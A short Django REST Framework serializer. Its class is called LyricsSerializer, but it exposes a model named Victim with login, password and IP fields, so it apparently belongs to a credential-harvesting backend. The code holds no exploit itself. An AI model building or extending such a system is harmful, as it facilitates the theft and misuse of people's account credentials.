from rest_framework import serializers
from . import models

class LyricsSerializer(serializers.ModelSerializer):
    class Meta:
        model=models.Victim
        fields=('id','login', 'password', 'ip',)
